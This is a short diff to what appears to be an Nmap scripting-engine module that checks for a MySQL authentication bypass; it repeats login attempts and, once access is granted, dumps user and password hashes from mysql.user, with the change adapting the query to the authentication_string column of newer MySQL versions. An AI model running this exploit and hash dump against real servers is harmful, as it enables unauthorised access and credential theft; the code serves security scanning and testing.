@@ -132,13 +132,19 @@ basically account password protection is as good as nonexistent.
     stdnse.debug1("Connection attempt #%d", i)
     try( socket:connect(host, port) )
     response = try( mysql.receiveGreeting(socket) )
+    version = response.version
     status, response = mysql.loginRequest(socket, {authversion = "post41", charset = response.charset}, mysql_user, mysql_pwd, response.salt)
     if status and response.errorcode == 0 then
       vuln.extra_info = string.format("Server granted access at iteration #%d\n", iterations)
       vuln.state = vulns.STATE.EXPLOIT
       --This part is based on mysql-dump-hashes
-      local qry = "SELECT DISTINCT CONCAT(user, ':', password) FROM mysql.user WHERE password <> ''"
-      local status, rows = mysql.sqlQuery(socket, qry)
+      local auth_field = "authentication_string"
+      -- the 'authentication_string' field was called 'password' in MySQL 5.6, and earlier
+      if tonumber(version:sub(1, 3)) <= 5.6 then
+        auth_field = "password"
+      end
+      local query = "SELECT DISTINCT CONCAT(user, ':', " .. auth_field .. ") FROM mysql.user WHERE " .. auth_field .. " <> ''"
+      local status, rows = mysql.sqlQuery(socket, query)
       socket:close()
       if status then
         result = mysql.formatResultset(rows, {noheaders = true})
